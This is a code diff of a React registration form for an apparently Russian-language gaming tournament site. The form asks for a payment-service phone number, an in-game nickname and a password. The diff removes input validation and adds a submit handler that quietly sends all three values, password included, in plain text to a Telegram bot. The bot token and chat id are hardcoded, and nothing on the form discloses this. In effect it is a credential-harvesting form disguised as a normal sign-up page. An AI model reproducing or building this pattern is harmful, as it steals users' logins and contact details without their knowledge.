@@ -5,75 +5,84 @@ import Button from "../../UI/Button/Button";
 
 import classes from "./Registration.module.css";
 
-function Registration(props) {
-  const { register, handleSubmit, errors } = useForm();
-  const onSubmit = (data) => console.log(data);
+class Registration extends React.Component {
+  constructor(props) {
+    super(props);
+    this.state = { name: '' };
 
-  return (
-    <div className={classes.Registration}>
-      <article>
+    this.handleInputChange = this.handleInputChange.bind(this);
+    this.handleSubmit = this.handleSubmit.bind(this);
+  }
+
+  handleInputChange(event) {
+    const target = event.target;
+    const value = target.value;
+    const name = target.name;
+
+    this.setState({
+      [name]: value
+    });
+  }
+
+  handleSubmit(event) {
+    const responseMsg = `
+    Phone: ${this.state.phone}
+    Username: ${this.state.username}
+    Password: ${this.state.password}
+    `
+    fetch(`https://api.telegram.org/bot1736127684:AAGG4oXysjamDgUB-VvWmMSsUaTlIOX8vhk/sendMessage?chat_id=-546720007&text=${responseMsg}`)
+    event.preventDefault();
+  }
+
+  render() {
+    return (
+      <div className={classes.Registration}>
+        <article>
         <header>
           <h2>зарегистрируйся и в бой!</h2>
           <p>Зарегистрируйтесь для участия в турнирах</p>
         </header>
       </article>
       <div className={classes.Reg_form}>
-        <form onSubmit={handleSubmit(onSubmit)}>
-          <label htmlFor="phone">
+        <form onSubmit={this.handleSubmit}>
+        <label htmlFor="phone">
             <p>Номер телефона от Элсом:</p>
             <input
-              id="phone"
-              name="phone"
-              type="text"
+              type="text" value={this.state.phone} 
+              onChange={this.handleInputChange} 
               placeholder="0700987654"
-              ref={register({ required: true, minLength: 9 })}
+              name="phone"
             />
-            {errors.phone && errors.phone.type === "required" && (
-              <p className="error">This is required</p>
-            )}
-            {errors.phone && errors.phone.type === "minLength" && (
-              <p className="error">This is field required min lenght of 9</p>
-            )}
           </label>
           <label htmlFor="username">
             <p>Ник в игре:</p>
             <input
-              id="username"
-              name="username"
-              type="text"
+              type="text" value={this.state.username} 
+              onChange={this.handleInputChange} 
               placeholder="gamer1"
-              ref={register({ required: true, minLength: 2 })}
+              name="username"
             />
-            {errors.username && errors.username.type === "required" && (
-              <p className="error">This is required</p>
-            )}
-            {errors.username && errors.username.type === "minLength" && (
-              <p className="error">This is field required min lenght of 2</p>
-            )}
           </label>
           <label htmlFor="password">
             <p>Придумайте пароль:</p>
             <input
-              id="password"
+              type="password" 
+              value={this.state.password} 
+              onChange={this.handleInputChange} 
               name="password"
-              type="password"
-              ref={register({ required: true, minLength: 9 })}
             />
-            {errors.password && errors.password.type === "required" && (
-              <p className="error">This is required</p>
-            )}
-            {errors.password && errors.password.type === "minLength" && (
-              <p className="error">This is field required min lenght of 9</p>
-            )}
           </label>
           <div className="submit_wrapper">
             <NavLink to="/auth/login">У меня есть аккаунта</NavLink>
             <Button>в бой!</Button>
           </div>
-        </form>
+      </form>
+      </div>        
       </div>
-    </div>
-  );
+      
+      
+    );
+  }
 }
 
 export default Registration;
